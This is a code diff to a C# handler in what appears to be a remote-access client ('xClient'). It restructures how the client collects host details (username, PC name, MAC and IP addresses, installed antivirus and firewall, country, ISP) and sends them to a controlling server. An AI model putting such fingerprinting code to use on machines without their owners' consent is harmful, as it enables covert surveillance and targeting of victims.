@@ -329,48 +329,29 @@ namespace xClient.Core.Commands
                 var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                 var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
 
-
-                string[] infoCollection = new string[]
+                List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                 {
-                    "Processor (CPU)",
-                    DevicesHelper.GetCpuName(),
-                    "Memory (RAM)",
-                    string.Format("{0} MB", DevicesHelper.GetTotalRamAmount()),
-                    "Video Card (GPU)",
-                    DevicesHelper.GetGpuName(),
-                    "Username",
-                    WindowsAccountHelper.GetName(),
-                    "PC Name",
-                    SystemHelper.GetPcName(),
-                    "Domain Name",
-                    domainName,
-                    "Host Name",
-                    hostName,
-                    "System Drive",
-                    Path.GetPathRoot(Environment.SystemDirectory),
-                    "System Directory",
-                    Environment.SystemDirectory,
-                    "Uptime",
-                    SystemHelper.GetUptime(),
-                    "MAC Address",
-                    DevicesHelper.GetMacAddress(),
-                    "LAN IP Address",
-                    DevicesHelper.GetLanIp(),
-                    "WAN IP Address",
-                    GeoLocationHelper.GeoInfo.Ip,
-                    "Antivirus",
-                    SystemHelper.GetAntivirus(),
-                    "Firewall",
-                    SystemHelper.GetFirewall(),
-                    "Time Zone",
-                    GeoLocationHelper.GeoInfo.Timezone,
-                    "Country",
-                    GeoLocationHelper.GeoInfo.Country,
-                    "ISP",
-                    GeoLocationHelper.GeoInfo.Isp
+                    new Tuple<string, string>("Processor (CPU)", DevicesHelper.GetCpuName()),
+                    new Tuple<string, string>("Memory (RAM)", $"{DevicesHelper.GetTotalRamAmount()} MB"),
+                    new Tuple<string, string>("Video Card (GPU)", DevicesHelper.GetGpuName()),
+                    new Tuple<string, string>("Username", WindowsAccountHelper.GetName()),
+                    new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
+                    new Tuple<string, string>("Domain Name", domainName),
+                    new Tuple<string, string>("Host Name", hostName),
+                    new Tuple<string, string>("System Drive", Path.GetPathRoot(Environment.SystemDirectory)),
+                    new Tuple<string, string>("System Directory", Environment.SystemDirectory),
+                    new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
+                    new Tuple<string, string>("MAC Address", DevicesHelper.GetMacAddress()),
+                    new Tuple<string, string>("LAN IP Address", DevicesHelper.GetLanIp()),
+                    new Tuple<string, string>("WAN IP Address", GeoLocationHelper.GeoInfo.Ip),
+                    new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
+                    new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
+                    new Tuple<string, string>("Time Zone", GeoLocationHelper.GeoInfo.Timezone),
+                    new Tuple<string, string>("Country", GeoLocationHelper.GeoInfo.Country),
+                    new Tuple<string, string>("ISP", GeoLocationHelper.GeoInfo.Isp)
                 };
 
-                client.Send(new GetSystemInfoResponse {SystemInfos = infoCollection});
+                client.Send(new GetSystemInfoResponse {SystemInfos = lstInfos});
             }
             catch
             {
